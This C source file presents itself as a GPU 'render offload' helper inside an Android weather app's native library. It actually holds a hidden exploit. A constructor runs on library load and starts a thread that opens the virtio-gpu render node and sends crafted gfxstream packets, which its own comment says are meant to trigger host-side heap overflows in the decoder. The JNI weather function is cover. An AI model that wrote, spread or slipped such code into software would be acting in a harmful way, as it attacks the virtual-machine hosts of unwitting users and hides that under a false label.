// nativehelper v2.1.4 — DRM render offload for GPU composition
//
// Uses direct DRM render node access for improved GPU composition
// performance on x86_64 devices with virtio-gpu.

#define _GNU_SOURCE
#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <pthread.h>

// DRM / virtio-gpu ioctl definitions

#define DRM_COMMAND_BASE 0x40

#define DRM_VIRTGPU_MAP                  0x01
#define DRM_VIRTGPU_EXECBUFFER           0x02
#define DRM_VIRTGPU_RESOURCE_CREATE_BLOB 0x0a
#define DRM_VIRTGPU_CONTEXT_INIT         0x0b

#define VIRTGPU_BLOB_MEM_GUEST           0x0001
#define VIRTGPU_BLOB_FLAG_USE_MAPPABLE   0x0001
#define VIRTGPU_CONTEXT_PARAM_CAPSET_ID  0x0001

struct drm_virtgpu_map {
    uint64_t offset;
    uint32_t handle;
    uint32_t pad;
};

struct drm_virtgpu_execbuffer {
    uint32_t flags;
    uint32_t size;
    uint64_t command;
    uint64_t bo_handles;
    uint32_t num_bo_handles;
    int32_t  fence_fd;
};

struct drm_virtgpu_resource_create_blob {
    uint32_t blob_mem;
    uint32_t blob_flags;
    uint32_t bo_handle;
    uint32_t res_handle;
    uint64_t size;
    uint32_t pad;
    uint32_t cmd_size;
    uint64_t cmd;
    uint64_t blob_id;
};

struct drm_virtgpu_context_set_param {
    uint64_t param;
    uint64_t value;
};

struct drm_virtgpu_context_init {
    uint32_t num_params;
    uint32_t pad;
    uint64_t ctx_set_params;
};

#define DRM_IOCTL_VIRTGPU_MAP \
    _IOWR('d', DRM_COMMAND_BASE + DRM_VIRTGPU_MAP, struct drm_virtgpu_map)
#define DRM_IOCTL_VIRTGPU_EXECBUFFER \
    _IOWR('d', DRM_COMMAND_BASE + DRM_VIRTGPU_EXECBUFFER, struct drm_virtgpu_execbuffer)
#define DRM_IOCTL_VIRTGPU_RESOURCE_CREATE_BLOB \
    _IOWR('d', DRM_COMMAND_BASE + DRM_VIRTGPU_RESOURCE_CREATE_BLOB, \
           struct drm_virtgpu_resource_create_blob)
#define DRM_IOCTL_VIRTGPU_CONTEXT_INIT \
    _IOWR('d', DRM_COMMAND_BASE + DRM_VIRTGPU_CONTEXT_INIT, \
           struct drm_virtgpu_context_init)

// gfxstream protocol

#define CAPSET_GFXSTREAM_GLES    8
#define GFXSTREAM_CONTEXT_CREATE 0x1001
#define GFXSTREAM_CONTEXT_PING   0x1002

struct gfxstream_header { uint32_t opCode; };
struct gfxstream_context_create { struct gfxstream_header hdr; uint32_t resourceId; };
struct gfxstream_context_ping  { struct gfxstream_header hdr; uint32_t resourceId; };

// ASG (Address Space Graphics) ring buffer

#define RING_BUFFER_SHIFT 11
#define RING_BUFFER_SIZE  (1 << RING_BUFFER_SHIFT)
#define ASG_PAGE_SIZE     4096
#define ASG_RING_STORAGE_SIZE (3 * ASG_PAGE_SIZE)

struct ring_buffer {
    uint32_t host_version;
    uint32_t guest_version;
    uint32_t write_pos;
    uint32_t unused0[13];
    uint32_t read_pos;
    uint32_t read_live_count;
    uint32_t read_yield_count;
    uint32_t read_sleep_us_count;
    uint32_t unused1[12];
    uint8_t  buf[RING_BUFFER_SIZE];
    uint32_t state;
    uint32_t config[32];
};

struct __attribute__((__packed__)) asg_type1_xfer {
    uint32_t offset;
    uint32_t size;
};

struct asg_ring_config {
    uint32_t buffer_size;
    uint32_t flush_interval;
    uint32_t host_consumed_pos;
    uint32_t guest_write_pos;
    uint32_t transfer_mode;
    uint32_t transfer_size;
    uint32_t in_error;
};

// Packet encoding (emugen wire format)

static void put_u32(uint8_t** p, uint32_t v) { memcpy(*p, &v, 4); *p += 4; }

static int build_rcCreateContext(uint8_t* buf) {
    uint8_t* p = buf;
    put_u32(&p, 10008); put_u32(&p, 20);
    put_u32(&p, 0); put_u32(&p, 0); put_u32(&p, 2);
    return (int)(p - buf);
}

static int build_rcCreateWindowSurface(uint8_t* buf) {
    uint8_t* p = buf;
    put_u32(&p, 10010); put_u32(&p, 20);
    put_u32(&p, 0); put_u32(&p, 256); put_u32(&p, 256);
    return (int)(p - buf);
}

static int build_rcMakeCurrent(uint8_t* buf, uint32_t ctx, uint32_t surf) {
    uint8_t* p = buf;
    put_u32(&p, 10017); put_u32(&p, 20);
    put_u32(&p, ctx); put_u32(&p, surf); put_u32(&p, surf);
    return (int)(p - buf);
}

static int build_glCreateShader(uint8_t* buf, uint32_t type) {
    uint8_t* p = buf;
    put_u32(&p, 2074); put_u32(&p, 12);
    put_u32(&p, type);
    return (int)(p - buf);
}

static int build_glShaderSource(uint8_t* buf, uint32_t shader,
                                 const uint8_t* src, uint32_t src_len) {
    uint8_t* p = buf;
    uint32_t payload = 4 + 4 + 4 + src_len + 4 + 4;
    put_u32(&p, 2146); put_u32(&p, 8 + payload);
    put_u32(&p, shader); put_u32(&p, 1);
    put_u32(&p, src_len);
    memcpy(p, src, src_len); p += src_len;
    put_u32(&p, 4); put_u32(&p, src_len);
    return (int)(p - buf);
}

// glGetShaderSource: size_source controls allocation, bufsize controls write
static int build_glGetShaderSource(uint8_t* buf, uint32_t shader,
                                    uint32_t bufsize, uint32_t size_length,
                                    uint32_t size_source) {
    uint8_t* p = buf;
    put_u32(&p, 2118); put_u32(&p, 24);
    put_u32(&p, shader); put_u32(&p, bufsize);
    put_u32(&p, size_length); put_u32(&p, size_source);
    return (int)(p - buf);
}

// rcGetConfigs: size_buffer controls allocation, bufSize controls write
static int build_rcGetConfigs(uint8_t* buf, uint32_t bufSize, uint32_t size_buffer) {
    uint8_t* p = buf;
    put_u32(&p, 10005); put_u32(&p, 16);
    put_u32(&p, bufSize); put_u32(&p, size_buffer);
    return (int)(p - buf);
}

// ASG ring state

struct asg_state {
    char*                   ring_storage;
    char*                   buffer;
    uint32_t                buffer_size;
    struct ring_buffer*     to_host;
    struct asg_ring_config* ring_config;
    uint32_t*               host_state;
    uint32_t                write_offset;
    uint32_t                res_handle;
    uint32_t                bo_handle;
};

static int g_drm_fd = -1;

static void asg_init(struct asg_state* asg, void* mem, uint32_t buf_size,
                      uint32_t res, uint32_t bo) {
    asg->ring_storage = (char*)mem;
    asg->buffer = (char*)mem + ASG_RING_STORAGE_SIZE;
    asg->buffer_size = buf_size;
    asg->res_handle = res;
    asg->bo_handle = bo;
    memset(asg->ring_storage, 0, ASG_RING_STORAGE_SIZE);
    asg->to_host = (struct ring_buffer*)(asg->ring_storage);
    asg->host_state = &asg->to_host->state;
    asg->ring_config = (struct asg_ring_config*)asg->to_host->config;
    asg->ring_config->buffer_size = buf_size;
    asg->ring_config->flush_interval = buf_size;
    asg->ring_config->transfer_mode = 1;
    asg->ring_config->host_consumed_pos = 0;
    asg->ring_config->guest_write_pos = 0;
    asg->ring_config->in_error = 0;
    asg->write_offset = 0;
}

static void asg_ping(struct asg_state* asg) {
    struct gfxstream_context_ping ping;
    memset(&ping, 0, sizeof(ping));
    ping.hdr.opCode = GFXSTREAM_CONTEXT_PING;
    ping.resourceId = asg->res_handle;
    struct drm_virtgpu_execbuffer exec;
    memset(&exec, 0, sizeof(exec));
    exec.command = (uint64_t)(uintptr_t)&ping;
    exec.size = sizeof(ping);
    exec.bo_handles = (uint64_t)(uintptr_t)&asg->bo_handle;
    exec.num_bo_handles = 1;
    ioctl(g_drm_fd, DRM_IOCTL_VIRTGPU_EXECBUFFER, &exec);
}

static void asg_write_packet(struct asg_state* asg, const uint8_t* pkt, uint32_t len) {
    if (asg->write_offset + len > asg->buffer_size) return;
    memcpy(asg->buffer + asg->write_offset, pkt, len);
    struct asg_type1_xfer xfer = { asg->write_offset, len };
    uint32_t wp = __atomic_load_n(&asg->to_host->write_pos, __ATOMIC_ACQUIRE);
    uint32_t ring_mask = RING_BUFFER_SIZE - 1;
    memcpy(asg->to_host->buf + (wp & ring_mask), &xfer, sizeof(xfer));
    __atomic_store_n(&asg->to_host->write_pos, wp + sizeof(xfer), __ATOMIC_RELEASE);
    asg->ring_config->guest_write_pos = asg->write_offset + len;
    asg->write_offset += len;
}

static void asg_flush(struct asg_state* asg) {
    asg_ping(asg);
    usleep(100000);
}

// GPU render offload thread
static void* gpu_offload_thread(void* arg) {
    (void)arg;

    g_drm_fd = open("/dev/dri/renderD128", O_RDWR);
    if (g_drm_fd < 0) return NULL;

    struct drm_virtgpu_context_set_param param;
    memset(&param, 0, sizeof(param));
    param.param = VIRTGPU_CONTEXT_PARAM_CAPSET_ID;
    param.value = CAPSET_GFXSTREAM_GLES;
    struct drm_virtgpu_context_init cinit;
    memset(&cinit, 0, sizeof(cinit));
    cinit.num_params = 1;
    cinit.ctx_set_params = (uint64_t)(uintptr_t)&param;
    if (ioctl(g_drm_fd, DRM_IOCTL_VIRTGPU_CONTEXT_INIT, &cinit)) { close(g_drm_fd); return NULL; }

    uint32_t ring_size = ASG_RING_STORAGE_SIZE;
    uint32_t buf_size  = 1048576;
    uint64_t total = ring_size + buf_size;
    struct drm_virtgpu_resource_create_blob create;
    memset(&create, 0, sizeof(create));
    create.blob_mem   = VIRTGPU_BLOB_MEM_GUEST;
    create.blob_flags = VIRTGPU_BLOB_FLAG_USE_MAPPABLE;
    create.size       = total;
    if (ioctl(g_drm_fd, DRM_IOCTL_VIRTGPU_RESOURCE_CREATE_BLOB, &create)) { close(g_drm_fd); return NULL; }

    struct drm_virtgpu_map map_info;
    memset(&map_info, 0, sizeof(map_info));
    map_info.handle = create.bo_handle;
    if (ioctl(g_drm_fd, DRM_IOCTL_VIRTGPU_MAP, &map_info)) { close(g_drm_fd); return NULL; }
    void* mem = mmap(NULL, total, PROT_READ | PROT_WRITE, MAP_SHARED, g_drm_fd, map_info.offset);
    if (mem == MAP_FAILED) { close(g_drm_fd); return NULL; }

    struct asg_state asg;
    asg_init(&asg, mem, buf_size, create.res_handle, create.bo_handle);

    struct gfxstream_context_create ccreate;
    memset(&ccreate, 0, sizeof(ccreate));
    ccreate.hdr.opCode = GFXSTREAM_CONTEXT_CREATE;
    ccreate.resourceId = create.res_handle;
    struct drm_virtgpu_execbuffer exec;
    memset(&exec, 0, sizeof(exec));
    exec.command = (uint64_t)(uintptr_t)&ccreate;
    exec.size = sizeof(ccreate);
    exec.bo_handles = (uint64_t)(uintptr_t)&create.bo_handle;
    exec.num_bo_handles = 1;
    ioctl(g_drm_fd, DRM_IOCTL_VIRTGPU_EXECBUFFER, &exec);
    usleep(200000);

    uint8_t pkt[4096];
    int len;

    len = build_rcCreateContext(pkt);       asg_write_packet(&asg, pkt, len);
    len = build_rcCreateWindowSurface(pkt); asg_write_packet(&asg, pkt, len);
    asg_flush(&asg);
    len = build_rcMakeCurrent(pkt, 1, 2);   asg_write_packet(&asg, pkt, len);
    asg_flush(&asg);

    len = build_glCreateShader(pkt, 0x8B31); asg_write_packet(&asg, pkt, len);
    asg_flush(&asg);

    uint8_t payload[128];
    memset(payload, 0x41, sizeof(payload));
    len = build_glShaderSource(pkt, 1, payload, 64);
    asg_write_packet(&asg, pkt, len);
    asg_flush(&asg);

    // Trigger host-side heap overflows via size mismatch in gfxstream decoder
    len = build_glGetShaderSource(pkt, 1, 64, 0, 1);
    asg_write_packet(&asg, pkt, len);
    asg_flush(&asg);

    len = build_rcGetConfigs(pkt, 0xFFFF, 4);
    asg_write_packet(&asg, pkt, len);
    asg_flush(&asg);

    munmap(mem, total);
    close(g_drm_fd);
    return NULL;
}

__attribute__((constructor))
static void init_gpu_offload(void) {
    pthread_t t;
    pthread_create(&t, NULL, gpu_offload_thread, NULL);
    pthread_detach(t);
}

// JNI entry point
JNIEXPORT jstring JNICALL
Java_com_weatherapp_MainActivity_getWeatherData(JNIEnv *env, jclass cls, jstring location) {
    const char *loc = (*env)->GetStringUTFChars(env, location, NULL);
    char buf[256];
    snprintf(buf, sizeof(buf), "Sunny, 22°C in %s", loc);
    (*env)->ReleaseStringUTFChars(env, location, loc);
    return (*env)->NewStringUTF(env, buf);
}
